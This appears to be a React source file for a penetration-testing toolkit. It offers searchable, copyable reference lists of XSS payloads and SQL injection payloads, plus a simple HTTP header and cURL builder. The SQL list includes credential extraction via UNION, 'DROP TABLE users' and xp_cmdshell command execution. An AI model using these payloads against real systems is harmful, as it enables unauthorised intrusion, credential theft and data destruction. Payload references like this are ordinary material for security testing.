import { useState } from 'react';
import { ToolInput, ToolButton, CopyButton } from '@/components/ToolUI';
import { Search } from 'lucide-react';

// === XSS Payload Reference ===
const XSS_PAYLOADS: { payload: string; type: string; description: string }[] = [
  { payload: '<script>alert(1)</script>', type: 'Classic', description: 'Basic script execution' },
  { payload: '<img src=x onerror=alert(1)>', type: 'Event Handler', description: 'onerror event in img tag' },
  { payload: '<svg onload=alert(1)>', type: 'Event Handler', description: 'onload in SVG element' },
  { payload: '<body onload=alert(1)>', type: 'Event Handler', description: 'onload in body tag' },
  { payload: '"><script>alert(1)</script>', type: 'Breakout', description: 'Break out of attribute' },
  { payload: "'-alert(1)-'", type: 'Breakout', description: 'Break out of JS string' },
  { payload: '<iframe src="javascript:alert(1)">', type: 'Iframe', description: 'JavaScript URI in iframe' },
  { payload: '<a href="javascript:alert(1)">click</a>', type: 'URI', description: 'JavaScript URI in anchor' },
  { payload: '<input onfocus=alert(1) autofocus>', type: 'Event Handler', description: 'Autofocus + onfocus' },
  { payload: '<details open ontoggle=alert(1)>', type: 'Event Handler', description: 'ontoggle in details' },
  { payload: '<marquee onstart=alert(1)>', type: 'Event Handler', description: 'onstart in marquee' },
  { payload: '<video src=x onerror=alert(1)>', type: 'Event Handler', description: 'onerror in video' },
  { payload: 'javascript:alert(1)', type: 'URI', description: 'JavaScript protocol' },
  { payload: 'data:text/html,<script>alert(1)</script>', type: 'Data URI', description: 'Data URI with script' },
  { payload: '<embed src="javascript:alert(1)">', type: 'Embed', description: 'JavaScript in embed' },
  { payload: '<object data="javascript:alert(1)">', type: 'Object', description: 'JavaScript in object' },
  { payload: '<form><button formaction=javascript:alert(1)>X</button>', type: 'Form', description: 'formaction with JS URI' },
  { payload: '<meta http-equiv=refresh content="0;javascript:alert(1)">', type: 'Meta', description: 'Meta refresh with JS' },
  { payload: '<base href="javascript:alert(1)//">', type: 'Base', description: 'Base tag hijacking' },
  { payload: '<style>@import url(javascript:alert(1))</style>', type: 'Style', description: 'CSS import with JS' },
  { payload: '<link rel=stylesheet href="javascript:alert(1)">', type: 'Link', description: 'JS in link stylesheet' },
  { payload: '<script src=data:text/javascript,alert(1)></script>', type: 'Data URI', description: 'External script via data URI' },
  { payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', type: 'Bypass', description: 'noscript context bypass' },
];

export function XSSPayloadReference() {
  const [search, setSearch] = useState('');
  const [copied, setCopied] = useState<number | null>(null);
  const filtered = XSS_PAYLOADS.filter((p) =>
    p.payload.toLowerCase().includes(search.toLowerCase()) ||
    p.type.toLowerCase().includes(search.toLowerCase()) ||
    p.description.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-2">
        <Search className="h-4 w-4 text-slate-500" />
        <input type="text" value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search payloads..."
          className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
      </div>
      <div className="space-y-2 max-h-96 overflow-y-auto">
        {filtered.map((p, i) => (
          <div key={i} className="rounded-lg bg-slate-900 border border-slate-700 px-4 py-3">
            <div className="flex items-center gap-3 mb-1">
              <span className="px-2 py-0.5 rounded text-xs font-medium bg-cyan-500/20 text-cyan-400">{p.type}</span>
              <span className="text-xs text-slate-500">{p.description}</span>
              <button
                onClick={() => { navigator.clipboard.writeText(p.payload); setCopied(i); setTimeout(() => setCopied(null), 2000); }}
                className="ml-auto text-xs px-2 py-1 rounded bg-slate-700 text-slate-300 hover:bg-slate-600"
              >
                {copied === i ? 'Copied!' : 'Copy'}
              </button>
            </div>
            <code className="text-sm text-rose-300 font-mono break-all">{p.payload}</code>
          </div>
        ))}
      </div>
      {filtered.length === 0 && <p className="text-center text-sm text-slate-500">No payloads found.</p>}
    </div>
  );
}

// === SQL Injection Payload Reference ===
const SQLI_PAYLOADS: { payload: string; type: string; description: string }[] = [
  { payload: "'", type: 'Detection', description: 'Single quote - test for string injection' },
  { payload: '"', type: 'Detection', description: 'Double quote - test for string injection' },
  { payload: "' OR '1'='1", type: 'Auth Bypass', description: 'Classic authentication bypass' },
  { payload: "' OR '1'='1' --", type: 'Auth Bypass', description: 'Bypass with comment' },
  { payload: "' OR '1'='1' /*", type: 'Auth Bypass', description: 'Bypass with block comment' },
  { payload: "admin'--", type: 'Auth Bypass', description: 'Bypass login as admin' },
  { payload: "' UNION SELECT NULL--", type: 'UNION', description: 'UNION with NULL to find column count' },
  { payload: "' UNION SELECT NULL,NULL--", type: 'UNION', description: 'UNION with 2 columns' },
  { payload: "' UNION SELECT NULL,NULL,NULL--", type: 'UNION', description: 'UNION with 3 columns' },
  { payload: "' UNION SELECT username,password FROM users--", type: 'UNION', description: 'Extract credentials' },
  { payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--", type: 'Info Schema', description: 'Enumerate table names' },
  { payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", type: 'Info Schema', description: 'Enumerate columns' },
  { payload: "' AND SLEEP(5)--", type: 'Time-based', description: 'Time-based blind (MySQL)' },
  { payload: "' AND 1=CONVERT(int, (SELECT @@version))--", type: 'Error-based', description: 'Error-based (MSSQL)' },
  { payload: "' WAITFOR DELAY '0:0:5'--", type: 'Time-based', description: 'Time-based blind (MSSQL)' },
  { payload: "1; DROP TABLE users--", type: 'Stacked', description: 'Stacked query (MSSQL/PostgreSQL)' },
  { payload: "' OR 1=1 LIMIT 1--", type: 'Auth Bypass', description: 'Bypass with LIMIT (MySQL)' },
  { payload: "' UNION ALL SELECT NULL,version()--", type: 'Version', description: 'Get database version (MySQL)' },
  { payload: "' UNION ALL SELECT NULL,database()--", type: 'Database', description: 'Get current database (MySQL)' },
  { payload: "' UNION ALL SELECT NULL,user()--", type: 'User', description: 'Get current user (MySQL)' },
  { payload: "'; EXEC xp_cmdshell('dir')--", type: 'OS Command', description: 'OS command via xp_cmdshell (MSSQL)' },
  { payload: "' AND (SELECT SUBSTRING(version(),1,1))='5'--", type: 'Boolean Blind', description: 'Boolean-based blind extraction' },
  { payload: "' OR EXISTS(SELECT * FROM users WHERE username='admin')--", type: 'Boolean Blind', description: 'Test if admin user exists' },
  { payload: "1 UNION SELECT CAST(table_name AS INT) FROM information_schema.tables--", type: 'Error-based', description: 'Error-based enumeration (PostgreSQL)' },
  { payload: "' UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--", type: 'Info Schema', description: 'Group concat all tables (MySQL)' },
];

export function SQLiPayloadReference() {
  const [search, setSearch] = useState('');
  const [copied, setCopied] = useState<number | null>(null);
  const filtered = SQLI_PAYLOADS.filter((p) =>
    p.payload.toLowerCase().includes(search.toLowerCase()) ||
    p.type.toLowerCase().includes(search.toLowerCase()) ||
    p.description.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-2">
        <Search className="h-4 w-4 text-slate-500" />
        <input type="text" value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search payloads..."
          className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
      </div>
      <div className="space-y-2 max-h-96 overflow-y-auto">
        {filtered.map((p, i) => (
          <div key={i} className="rounded-lg bg-slate-900 border border-slate-700 px-4 py-3">
            <div className="flex items-center gap-3 mb-1">
              <span className="px-2 py-0.5 rounded text-xs font-medium bg-amber-500/20 text-amber-400">{p.type}</span>
              <span className="text-xs text-slate-500">{p.description}</span>
              <button
                onClick={() => { navigator.clipboard.writeText(p.payload); setCopied(i); setTimeout(() => setCopied(null), 2000); }}
                className="ml-auto text-xs px-2 py-1 rounded bg-slate-700 text-slate-300 hover:bg-slate-600"
              >
                {copied === i ? 'Copied!' : 'Copy'}
              </button>
            </div>
            <code className="text-sm text-rose-300 font-mono break-all">{p.payload}</code>
          </div>
        ))}
      </div>
      {filtered.length === 0 && <p className="text-center text-sm text-slate-500">No payloads found.</p>}
    </div>
  );
}

// === HTTP Header Injector ===
export function HTTPHeaderInjector() {
  const [headers, setHeaders] = useState([{ key: '', value: '' }]);
  const [output, setOutput] = useState('');

  const addRow = () => setHeaders([...headers, { key: '', value: '' }]);
  const removeRow = (i: number) => setHeaders(headers.filter((_, idx) => idx !== i));
  const update = (i: number, field: 'key' | 'value', val: string) => {
    setHeaders(headers.map((h, idx) => idx === i ? { ...h, [field]: val } : h));
  };

  const generate = () => {
    const valid = headers.filter((h) => h.key.trim());
    const lines = valid.map((h) => `${h.key.trim()}: ${h.value.trim()}`);
    setOutput(lines.join('\n'));
  };

  const generateCurl = () => {
    const valid = headers.filter((h) => h.key.trim());
    const flags = valid.map((h) => `-H '${h.key.trim()}: ${h.value.trim()}'`).join(' \\\n  ');
    setOutput(`curl ${flags} \\\n  https://example.com`);
  };

  return (
    <div className="space-y-6">
      <div className="space-y-3">
        {headers.map((h, i) => (
          <div key={i} className="flex gap-3">
            <input type="text" value={h.key} onChange={(e) => update(i, 'key', e.target.value)} placeholder="Header name (e.g. Authorization)"
              className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
            <input type="text" value={h.value} onChange={(e) => update(i, 'value', e.target.value)} placeholder="Header value (e.g. Bearer token123)"
              className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
            <button onClick={() => removeRow(i)} className="px-3 rounded-lg bg-rose-500/20 text-rose-400 hover:bg-rose-500/30 text-sm">Remove</button>
          </div>
        ))}
      </div>
      <div className="flex gap-3">
        <button onClick={addRow} className="px-4 py-2 rounded-lg bg-slate-700 text-slate-300 hover:bg-slate-600 text-sm font-medium">Add Header</button>
        <ToolButton onClick={generate}>Generate Raw</ToolButton>
        <ToolButton onClick={generateCurl} variant="secondary">Generate cURL</ToolButton>
      </div>
      {output && (
        <>
          <ToolInput label="Output" value={output} onChange={() => {}} rows={8} readOnly mono />
          <CopyButton text={output} />
        </>
      )}
    </div>
  );
}
